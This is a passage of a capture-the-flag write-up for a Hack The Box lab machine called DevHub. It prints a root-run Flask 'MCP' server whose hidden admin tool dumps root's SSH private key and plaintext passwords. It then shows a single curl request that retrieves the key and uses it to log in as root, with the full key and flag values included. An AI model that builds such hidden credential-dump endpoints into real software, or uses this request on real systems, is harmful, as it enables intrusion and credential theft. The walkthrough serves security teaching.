  Usage of /:            76.4% of 9.50GB
  Memory usage:          21%
  Swap usage:            0%
  Processes:             233
  Users logged in:       1
  IPv4 address for eth0: 10.129.9.81
  IPv6 address for eth0: dead:beef::a0de:adff:fed0:303a

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat May 30 19:37:01 2026 from 10.10.16.63
analyst@devhub:~$
```

## user.txt

```shell
analyst@devhub:~$ cat user.txt 
a2519dac617e65cd69e8e7ac3d87d706
```

## Enumeration (analyst)

The user `analyst` had no `sudo` rights and no supplementary group memberships of note. The hidden file `.opsmcp_key` in the home directory contained an `API` key for the `OPSMCP` internal service identified earlier on port `5000/TCP`.

```shell
analyst@devhub:~$ id
uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)
```

```shell
analyst@devhub:~$ sudo -l
[sudo] password for analyst: 
sudo: a password is required
```

```shell
analyst@devhub:~$ cat .opsmcp_key 
opsmcp_secret_key_4f5a6b7c8d9e0f1a
```

We reviewed `/opt/opsmcp/server.py` which revealed a `Flask` application running as `root` (as seen in the `pspy64` output). The server exposed a `/tools/call` endpoint accepting `POST` requests authenticated via the `X-API-Key` header. Crucially, the server maintained two tool dictionaries — `VISIBLE_TOOLS` (returned by `/tools/list`) and `HIDDEN_TOOLS` (not listed but fully callable). The hidden `ops._admin_dump` tool read `/root/.ssh/id_rsa` when called with `target=ssh_keys` and `confirm=true`, returning the private key content in the `JSON` response. Since the `Flask` process ran as `root`, it had direct filesystem access to read the key.

```shell
analyst@devhub:~$ cat /opt/opsmcp/server.py
#!/usr/bin/env python3
"""
OPSMCP - Operations MCP Server
Internal tool for system operations management
"""

from flask import Flask, jsonify, request
import os

app = Flask(__name__)

# API Key for authentication
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

# Registered tools (visible)
VISIBLE_TOOLS = {
    "ops.system_status": {
        "description": "Get system status and health metrics",
        "parameters": {}
    },
    "ops.list_services": {
        "description": "List running services",
        "parameters": {}
    },
    "ops.check_disk": {
        "description": "Check disk usage",
        "parameters": {}
    },
    "ops.view_logs": {
        "description": "View recent system logs",
        "parameters": {"service": "string"}
    }
}

# Hidden tools (not in /tools/list but callable)
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {
        "description": "Enable debug mode",
        "parameters": {}
    }
}

ALL_TOOLS = {**VISIBLE_TOOLS, **HIDDEN_TOOLS}

def check_auth():
    """Check API key authentication"""
    api_key = request.headers.get('X-API-Key', '')
    return api_key == VALID_API_KEY

@app.route('/')
def index():
    return jsonify({
        "server": "OPSMCP",
        "version": "2.1.0",
        "status": "operational",
        "endpoints": ["/tools/list", "/tools/call", "/health"],
        "auth": "Required - X-API-Key header"
    })

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "uptime": "14d 3h 22m"})

@app.route('/tools/list')
def list_tools():
    if not check_auth():
        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401
    
    return jsonify({
        "tools": list(VISIBLE_TOOLS.keys()),
        "count": len(VISIBLE_TOOLS),
        "details": VISIBLE_TOOLS
    })

@app.route('/tools/call', methods=['POST'])
def call_tool():
    if not check_auth():
        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401
    
    data = request.get_json() or {}
    tool_name = data.get('name', '')
    args = data.get('arguments', {})
    
    if not tool_name:
        return jsonify({"error": "Tool name required"}), 400
    
    if tool_name not in ALL_TOOLS:
        return jsonify({"error": f"Unknown tool: {tool_name}"}), 404
    
    # Execute tool
    if tool_name == "ops.system_status":
        return jsonify({
            "cpu": "23%",
            "memory": "1.2GB/4GB",
            "load": "0.45",
            "status": "nominal"
        })
    
    elif tool_name == "ops.list_services":
        return jsonify({
            "services": [
                {"name": "nginx", "status": "running", "pid": 1234},
                {"name": "opsmcp", "status": "running", "pid": 5678},
                {"name": "jupyter", "status": "running", "pid": 9012},
                {"name": "mcpjam", "status": "running", "pid": 3456}
            ]
        })
    
    elif tool_name == "ops.check_disk":
        return jsonify({
            "filesystems": [
                {"mount": "/", "used": "4.2G", "available": "15G", "percent": "22%"},
                {"mount": "/home", "used": "1.1G", "available": "8G", "percent": "12%"}
            ]
        })
    
    elif tool_name == "ops.view_logs":
        service = args.get('service', 'system')
        return jsonify({
            "service": service,
            "logs": [
                "[2026-01-22 10:00:01] Service started",
                "[2026-01-22 10:00:02] Listening on configured port",
                "[2026-01-22 10:15:33] Health check passed",
                "[2026-01-22 11:00:00] Routine maintenance completed"
            ]
        })
    
    elif tool_name == "ops._debug_mode":
        return jsonify({
            "debug": True,
            "message": "Debug mode enabled",
            "hidden_tools": list(HIDDEN_TOOLS.keys()),
            "note": "Debug endpoints now accessible"
        })
    
    elif tool_name == "ops._admin_dump":
        target = args.get('target', '')
        confirm = args.get('confirm', False)
        
        if not confirm:
            return jsonify({
                "error": "Confirmation required",
                "usage": "Set confirm=true to proceed",
                "warning": "This dumps sensitive credentials"
            })
        
        if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    key_data = f.read()
                return jsonify({
                    "target": "ssh_keys",
                    "root_private_key": key_data,
                    "note": "Emergency recovery key dump"
                })
            except Exception as e:
                return jsonify({
                    "target": "ssh_keys",
                    "error": f"Could not read key: {str(e)}"
                })
        
        elif target == "passwords":
            return jsonify({
                "target": "passwords",
                "dump": {
                    "root": "$6$rounds=656000$saltsalt$hashedpassword",
                    "analyst": "JupyterN0tebook!2026",
                    "mcp-dev": "Mcp!Insp3ct0r2026"
                }
            })
        
        elif target == "tokens":
            return jsonify({
                "target": "tokens",
                "api_tokens": {
                    "admin_token": "opsmcp_admin_7f3b9c2d1e4f5a6b",
                    "service_token": "opsmcp_svc_8c9d0e1f2a3b4c5d"
                }
            })
        
        else:
            return jsonify({
                "error": "Invalid target",
                "valid_targets": ["ssh_keys", "passwords", "tokens"]
            })
    
    return jsonify({"error": "Tool execution failed"}), 500

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)
```

## Privilege Escalation to root

### Hidden MCP Tool Abuse via Privileged Internal API

The `OPSMCP` server running as `root` and exposed hidden tools at `/tools/call` that are intentionally omitted from the `/tools/list` response — a pattern sometimes called a "hidden tool" or "shadow endpoint". The `ops._admin_dump` tool was designed as an emergency credential recovery mechanism but was accessible to any caller who hold the `API` key. Since `analyst` had access to the `API` key via `.opsmcp_key`, and the service was bound to `localhost:5000`, a single `curl` call was sufficient to retrieve `root`'s `SSH` private key.

A `curl` request with the `API` key and the `ops._admin_dump` tool invocation returned the `root` private key directly in the response body.

```shell
analyst@devhub:~$ curl -s -X POST http://127.0.0.1:5000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
{"note":"Emergency recovery key dump","root_private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9\nG/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX\n8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z\n6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n\nGhm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ\n7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W\nv9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu\nITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs\ngyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s\nqKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa\nV3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS\n0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6\nJtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8\nHUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB\ndcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L\nCvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2\nnkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn\nMz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK\nMtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI\noocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk\nJt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ\nnI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr\nC8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=\n-----END OPENSSH PRIVATE KEY-----\n","target":"ssh_keys"}
```

```shell
┌──(kali㉿kali)-[/mnt/…/HTB/Machines/DevHub/files]
└─$ cat root.id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9
G/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX
8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z
6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n
Ghm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ
7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W
v9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu
ITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs
gyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s
qKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa
V3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS
0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6
JtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8
HUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB
dcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L
Cvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2
nkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn
Mz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK
MtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI
oocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk
Jt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ
nI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr
C8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK
lFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=
-----END OPENSSH PRIVATE KEY-----
```

```shell
┌──(kali㉿kali)-[/mnt/…/HTB/Machines/DevHub/files]
└─$ chmod 600 root.id_rsa
```

```shell
┌──(kali㉿kali)-[/mnt/…/HTB/Machines/DevHub/files]
└─$ ssh -i root.id_rsa root@devhub.htb
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat May 30 07:43:49 PM UTC 2026

  System load:           0.0
  Usage of /:            76.4% of 9.50GB
  Memory usage:          22%
  Swap usage:            0%
  Processes:             236
  Users logged in:       2
  IPv4 address for eth0: 10.129.9.81
  IPv6 address for eth0: dead:beef::a0de:adff:fed0:303a

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat May 30 19:43:50 2026 from 10.10.16.63
root@devhub:~#
```

## root.txt

```shell
root@devhub:~# cat root.txt
e571e8416c0d3973d603cc447b169e5e
```
